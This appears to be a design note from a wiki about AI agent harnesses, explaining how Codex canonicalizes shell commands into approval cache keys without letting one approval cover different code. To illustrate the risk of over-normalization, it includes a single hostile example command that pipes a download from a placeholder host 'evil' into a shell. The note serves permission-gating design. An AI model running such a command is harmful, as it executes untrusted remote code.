---
type: concept
stage: permissions
tier: candidate
aliases: [canonicalize_command_for_approval, __codex_shell_script__, __codex_powershell_script__, approval cache key]
harnesses: [codex]
---
Normalize a command to a stable key before caching or persisting an approval, so cosmetic wrapper differences (`/bin/bash -lc` vs `bash -lc`) don't re-prompt, while complex scripts stay keyed by their exact text so an approval can never be reused for different code.

## Why
- Without normalization "approve for session" barely works: the model re-wraps the same command and the user is prompted again.
- With over-normalization an approval of `bash -lc "ls"` could cover `bash -lc "ls; curl evil | sh"`.
- Keys that are too coarse (per turn instead of per call) over-grant in parallel batches ([[approval-scope-too-broad-in-parallel-batch]]).

## Design space
- **Raw string key** — re-prompts on whitespace/wrapper changes.
- **Canonical argv for a single plain command; exact script text otherwise** — ✔ codex.
- **Semantic equivalence** (parse + normalize flags) — not attempted by codex.
- **Key scope**: per call id (✔ codex since `c4b771a16f`) vs per turn; session cache vs persistent rule ([[command-rule-policy]]).
- pi: no approval cache (no approvals).

## Implementations
- [[codex--approval-key-canonicalization|codex]] — `canonicalize_command_for_approval`: single command in `bash -lc` → its argv; else `["__codex_shell_script__", mode, script]`; PowerShell → `["__codex_powershell_script__", script]`.

## Failures
- [[approval-scope-too-broad-in-parallel-batch]]

## Related
[[approval-policy-modes]] · [[command-rule-policy]] · [[shell-command-intent-parsing]] · [[tool-call-gate]]
